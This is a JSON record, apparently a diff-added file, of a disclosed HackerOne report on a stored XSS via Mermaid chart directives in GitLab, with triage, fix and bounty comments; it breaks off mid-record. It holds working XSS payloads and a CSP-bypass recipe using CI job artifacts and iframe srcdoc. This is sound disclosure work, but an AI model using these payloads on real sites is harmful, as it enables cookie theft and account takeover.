@@ -1,0 +1,610 @@
+{
+  "id": 1103258,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTAzMjU4",
+  "url": "https://hackerone.com/reports/1103258",
+  "title": "Stored DOM XSS via Mermaid chart",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2021-02-14T17:05:15.273Z",
+  "submitted_at": "2021-02-14T17:05:15.425Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "taraszelyk",
+    "url": "/taraszelyk",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-07-12T23:00:30.698Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-07-12T23:00:30.523Z",
+  "team_member_agreed_on_going_public_at": "2021-07-12T22:51:14.032Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Prologue\n\nGitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.\n\nIn version 8.6.0, Mermaid added a support of directives to add more control over styles(themes) applied to the diagrams.\n\nYou can read more about how this works here: https://mermaid-js.github.io/mermaid/#/directives\n\nSyntax for declaring the directive is `%%{init: {<JSON_OBJECT>}}%%`\n\nDirectives can be used to overwrite default theme properties like `fontFamily` or `fontSize` to the graph.\n\nBehind the scenes, library takes `JSON_OBJECT` from directive and merges it with config object. Later that config is used to generate new CSS rules:\n\n```\n  let userStyles = '';\n  // user provided theme CSS\n  if (cnf.themeCSS !== undefined) {\n    userStyles += `\\n${cnf.themeCSS}`;\n  }\n  // user provided theme CSS\n  if (cnf.fontFamily !== undefined) {\n    userStyles += `\\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;\n  }\n  // user provided theme CSS\n  if (cnf.altFontFamily !== undefined) {\n    userStyles += `\\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;\n  }\n```\n\n## Vulnerability description\n\nProblem is that there is no sanitization of user-supplied values, which are added to `style` tag via `innerHTML` method afterwards:\n```\n  const stylis = new Stylis();\n  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));\n\n  const style1 = document.createElement('style');\n  style1.innerHTML = rules;\n  svg.insertBefore(style1, firstChild);\n```\n\nThis leads to Cross-Site Scripting attack via following directive:\n```\n%%{init: { 'fontFamily': '\\\"></style><img src=x onerror=alert(document.cookie)>'} }%%\n```\n## Steps to reproduce\n\n1. Create an issue in any repository\n2. Create mermaid diagram with following payload:\n```\n%%{init: { 'fontFamily': '\\\"></style><img src=x onerror=alert(document.cookie)>'} }%%\nsequenceDiagram\nAlice->>Bob: Hi Bob\nBob->>Alice: Hi Alice\n```\n\n3. Save the issue. XSS will be triggered every time a user opens a page with this issue.\n\n## PoC\nVisit https://gitlab.com/bugbountyuser1/asdf/-/issues/3\nYou will see CSP errors in the console. \n\n{F1195539}\n\n## What is the current *bug* behavior?\n\nMermaid fails to properly sanitize user-supplied input via directive which leads to XSS.\n\n## What is the expected *correct* behavior?\n\nMermaid strips/encodes malicious characters, so there is no way to perform XSS attack.\n\n## Output of checks\n\nThis vulnerability was tested on gitlab.com. CSP blocks XSS from executing, but I have an idea on how to bypass CSP.\nOn a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.\n\n### Results of GitLab environment info\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n## Impact\n\nThe Impact is standard as for any Stored XSS. User interaction is minimal - the user needs to navigate to a page with a Mermaid chart(issues page, etc). CSP is blocking XSS on gitlab.com, but I can work on XSS bypass if it is needed to show the impact/increase bounty amount. So let me know if you need CSP bypass too.",
+  "bounty_amount": "3000.0",
+  "formatted_bounty": "$3,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1195539,
+      "file_name": "2021-02-14_19-00.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2a2fct4tbhdvjgxnnl5vhivj6ifz?response-content-disposition=attachment%3B%20filename%3D%222021-02-14_19-00.png%22%3B%20filename%2A%3DUTF-8%27%272021-02-14_19-00.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071107Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=026a93191d0fe07ec31c91293d0091008151be9acc44b1d8384f16487ea83473",
+      "file_size": 174880,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 25,
+  "voters": [
+    "5h4l",
+    "osman1337",
+    "xenx",
+    "n1m0",
+    "bombon",
+    "iambouali",
+    "imranhudaa",
+    "ali",
+    "kmxx",
+    "akashhamal0x01",
+    "and 15 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 10670522,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @taraszelyk,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2021-02-14T17:19:34.226Z",
+      "updated_at": "2021-02-14T17:19:34.226Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 10674351,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNeedsMoreInfo",
+      "message": "Hey @taraszelyk,\n\nAren't you able to bypass the CSP? It's not a valid XSS otherwise but just an HTML injection and the severity may be downgraded.\n\nBest regards,\n@turtle_shell",
+      "automated_response": false,
+      "created_at": "2021-02-15T10:35:39.330Z",
+      "updated_at": "2021-02-15T10:35:39.330Z",
+      "actor": {
+        "username": "h1_analyst_caesar",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_caesar",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/2bkb69nvrwhkybw7m3gi9o2dumgp/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 10675591,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugNew",
+      "message": "\nSo, I have found a way to bypass CSP. It's a bit harder since our payload is injected into <style> tag via innerHTML, but I will try to explain all steps needed to perform XSS attack.\nFirst of all, we need to serve a JS code we want to execute somwehere on the gitlab.com Also, we need to have valid content-type(application/javascript) returned in the response. This can be achived by using CI/CD job artifacts. \n\n1. Create new project. \n2. Create a file `payload.js` with JS that will be executed in the victim's browser. For example:\n```\nalert(document.cookie)\n```\n\n3. Create .gitlab-ci.yml with such content:\n```\njs:\n  script: \"echo test\"\n  artifacts:\n    paths:\n    - payload.js\n    expire_in: 4 week\n```\nThis will trigger Gitlab CI and generate a job artfiact.\n\n4. Wait a minute while Gitlab CI finished a job and navigate to \"CI/CD\" -> \"Jobs\" -> Latest Job -> Job artifacts\nYou will see a link to download `payload.js` job artifact. It should look like this: `https://gitlab.com/<user>/csp/-/jobs/<job_id>/artifacts/raw/payload.js`\nStore it for later.\n\n5. We are going to use the script from step 3 to bypass CSP since it is allowed to include scripts form gitlab.com.\nTo dynamically include a script we can use `<iframe>` with `srcdoc` attribute:\n```\n<iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/<user>/asdf/-/jobs/<job_id>/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">\n```\nHowever, since our payload is injected via innerHTML into `<style>` tag browser will not parse iframe and, therefore, will not include a script. But I have noticed that if we prepend `<iframe>` tag with `<title>` tag it will work again. I am not sure of the root cause of this behavior and will investigate it later, but it works here.\n\nSo our final payload which needs to be injected in any field that supports Markdown:\n```\n%%{init: { 'fontFamily': '<title><iframe xmlns=\\\"http://www.w3.org/1999/xhtml\\\" srcdoc=\\\"&lt;script src=https://gitlab.com/bugbountyuser1/csp/-/jobs/1030502035/artifacts/raw/payload.js&gt; &lt;/script&gt;\\\">'} }%%\nsequenceDiagram\nAlice->>Bob: Hi Bob\nBob->>Alice: Hi Alice\n```\n[PoC](https://gitlab.com/bugbountyuser1/csp/-/issues/1)\n{F1196286}\n\n",
+      "automated_response": false,
+      "created_at": "2021-02-15T12:57:51.321Z",
+      "updated_at": "2021-02-15T12:57:51.321Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 1196286,
+          "filename": "2021-02-15_14-51.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jdjfrlvmlab3ftb3ppwgvvype6jp?response-content-disposition=attachment%3B%20filename%3D%222021-02-15_14-51.png%22%3B%20filename%2A%3DUTF-8%27%272021-02-15_14-51.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQX3NXO7QZ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T071107Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCbnlzM5i9WfTN9kNxGF%2BjO0%2FfzKIA0Hp70NjlTDwNasQIhAJyYEwtXT0%2BRZZxjv1NrFggoNOCoT3mU%2F7cjdG7P8rDbKrIFCCMQAxoMMDEzNjE5Mjc0ODQ5IgwINFq%2BLpY0xrM%2FogAqjwUr4hE%2FkGSCvZilvvzrBYsaW3zlott55AeXoNO%2Bj2HYvHW%2BaezLi6ZkzkofawG98TuqywgTo7pw1vT4K6IwMSLMTshH9WVsgHZCGplgQndh%2Byc9RHbjS5Vd8xr5Fz7oZobSe67MtQjAZRksk3xOS%2BnG%2BZdi591LH9JYcScpJi0a%2BayucR6SqtCTx3Ftfh0nKTYnFl4CvyKfDu3DIWu3N160aQ5ZH1xNmIB9u47MR7Y%2FPbUZ5zdMdhuN%2BDnB6z0vnZh9O8IR0bH5KF%2ByhW0ZDS5R8jyaDV%2F0lRV0O2taMMTbpJ%2F4EytVsnWR8sWfSzo6bVTiN%2B6mY%2BNLQChX0a8SL8ihPkK%2FueXSSAY9I4jT7HudO2YQwibAD%2Bdw9LKl35cfz7DRajTkq040qmhm91Yh3sPZpP1fuPVTsbSN7HfsvQGrZtNjEnMLOtMu61iHPDuEaC758m54aA56cSVZV6XrnGQQALFIgk7YTJ7APtpigQswVRHwyJyM2TOrarCDkx9FDWB3LkhBMfQjPTJwND4p0zsU2Td9KXP6Bl1O2xgmciDdmUWMsx45ZfUjMNiZ3PGvFGBzFZPsNJYuApSxy4oSGjI5o9WW0zLSETGgoUS4NFp1Kcv9YofmvzBSA08hDc2URAMdhmLCBhvZYKMA5IxeYX71XFIXJGVv9PamSlGZYUe5KPaagnP1MwmX3L227L9ytSPgmQEbhiZbUHzZrvRSB%2B5MnRZL225Rk0T7bKyORaST7iwdfCIhKdgDfuIPjykoBeXqMp8oE8hzVcNSrDaMqfYp%2FiMD99n6D4Q3kET9pMITkEi88Jw%2F5KSj9g77aiqCOhq8wf6%2FN7cEzwE1hPG9khV7asG7w7q5Ap09NS%2FoP0vPMJmGuagGOrAB55LPfipuctKTaGiNyV3c0qioH29nw%2FCxvbTC1WGAXoLJb3L25AlAYuDH8k1piCJEu5XYB84c%2B4aAb7sJGB2l8gv8cgewyAB1JuKmSpWOJ0dkGfMtQr627YQZFkefX%2B%2FekQoLWMLa6BWMaFqWi58mr23nneygiJiXGTTBD39ixLpEJxvuWk4%2F2pMnbJuQOLi8wolfYl8yYnBKLBKFqMTRVnYPYBE%2BTjE6e5FUUt0vkA4%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7511afb26a0a59dd3f8cdc43d8d1f3dc50bb89caf15cc7e9c6f4339a4998f63e"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 10704050,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hello @taraszelyk,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/321931.  This issue will be made public 30 days following the release of a patch.\n\nGiven the severity of the report, we are paying an initial $500 on triage. Congratulations!\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-02-18T00:47:17.709Z",
+      "updated_at": "2021-02-18T00:47:17.709Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 10704052,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-02-18T00:47:40.789Z",
+      "updated_at": "2021-02-18T00:47:40.789Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "taraszelyk",
+        "url": "/taraszelyk"
+      }
+    },
+    {
+      "id": 10716099,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "ETA for fix:\n\nHi @taraszelyk,\n\nThe issue you reported is currently scheduled to be fixed by 2021-05-31.\n\nThank you again for contacting us!\n\nBest regards,\nGitLab Security Team\n",
+      "automated_response": true,
+      "created_at": "2021-02-19T04:19:51.904Z",
+      "updated_at": "2021-02-19T04:19:51.904Z",
+      "actor": {
+        "username": "gitlab-securitybot",
+        "cleared": false,
+        "verified": false,
+        "url": "/gitlab-securitybot",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11501400,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @dcouture,\nI can confirm that this issue was fixed by upgrading to Mermaid 8.9.2 which includes a patch for this vulnerability.  It is no longer reproducible on gitlab.com. ",
+      "automated_response": false,
+      "created_at": "2021-04-24T18:50:19.765Z",
+      "updated_at": "2021-04-24T18:50:19.765Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11549146,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @taraszelyk,\n\nThank you again for the report! Your finding has been patched in GitLab version 13.11.2. Congratulations!\n\nAs far as we're concerned this and #1106238 are duplicates since that one Mermaid upgrade solved both of them so we're not going to award beyond the initial $500 you already received.\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-04-28T15:16:54.882Z",
+      "updated_at": "2021-04-28T15:16:54.882Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "taraszelyk",
+        "url": "/taraszelyk"
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11549425,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @dcouture,\nSorry, but I disagree with your decision that these two reports are duplicates. \nThey are separate issues, though in one library. I've spent time to find both of them. And spent time to make them work in Gitlab environment. And yes, one \"fix\"(Mermaid upgrade) from your side was required to patch them. But it's only because I've disclosed two vulnerabilities at once to the maintainer of the library so he fixed them together. And even in the library, they were not patched by the same patch.\n\nBy your logic, I should have submitted one issue, wait till the patch, get bounty and then submit another to be sure that I will be rewarded for all work that was done. I don't want to do such things and I think that it's wrong, but I find it unfair to the researcher to say that they are duplicates and reward for only one issue. So, I believe, you should reconsider your decision.",
+      "automated_response": false,
+      "created_at": "2021-04-28T15:39:35.507Z",
+      "updated_at": "2021-04-28T15:39:35.507Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11549637,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @taraszelyk,\n\nI understand your point of view and completely understand that this was two different issues in mermaid, but we are not the mermaid project. With that said I'll bring your comment back to the team and we'll discuss about how to handle such issues.\n\nThank you for your patience, I'll give you an update when we take a decision.\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-04-28T15:51:30.086Z",
+      "updated_at": "2021-04-28T15:51:30.086Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11549855,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you in advance.",
+      "automated_response": false,
+      "created_at": "2021-04-28T16:09:50.243Z",
+      "updated_at": "2021-04-28T16:09:50.243Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11581648,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello @taraszelyk,\n\nI'm having trouble finding where the issues were fixed, I only see that one issue where the maintainer mentions both bugs. Do you happen to have a reference to the commits?\n\nThanks,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-04-30T17:10:01.478Z",
+      "updated_at": "2021-04-30T17:10:01.478Z",
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11581755,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Sure, here is the issue https://github.com/mermaid-js/mermaid/issues/1940 and commit with fixes https://github.com/mermaid-js/mermaid/commit/0f31471b2ee3c7451485953d549fca7e2df1fb01",
+      "automated_response": false,
+      "created_at": "2021-04-30T17:22:40.054Z",
+      "updated_at": "2021-04-30T17:22:40.054Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 11604012,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Hello @taraszelyk,\n\nWe are going to award this issue as well since as you mentioned it's a separate issue and we do not want to encourage hackers to hold on to vulnerabilities just to maximize payouts. Having both issues fixed in the same commit didn't make this easy, but we can see that the prototype pollution and the template issue have distinct root causes.\n\nBest regards,\nDominic\nGitLab Security Team",
+      "automated_response": false,
+      "created_at": "2021-05-03T20:06:33.202Z",
+      "updated_at": "2021-05-03T20:06:33.202Z",
+      "actor": {
+        "url": "/gitlab",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "GitLab"
+        }
+      },
+      "bounty_amount": "2500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "gitlab",
+      "collaborator": {
+        "username": "taraszelyk",
+        "url": "/taraszelyk"
+      }
+    },
+    {
+      "id": 11609905,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your decision! ",
+      "automated_response": false,
+      "created_at": "2021-05-04T09:33:24.042Z",
+      "updated_at": "2021-05-04T09:33:24.042Z",
+      "actor": {
+        "username": "taraszelyk",
+        "cleared": false,
+        "verified": false,
+        "url": "/taraszelyk",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12460759,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-12T22:51:04.250Z",
+      "updated_at": "2021-07-12T22:51:04.250Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "High",
+        "old_severity_id": 985838,
+        "new_severity_id": 1143714
+      },
+      "actor": {
+        "username": "dcouture",
+        "cleared": false,
+        "verified": false,
+        "url": "/dcouture",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "gitlab"
+    },
+    {
+      "id": 12460760,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-07-12T22:51:14.060Z",
+      "updated_at": "2021-07-12T22:51:14.060Z",
+      "first_to_agree": true,
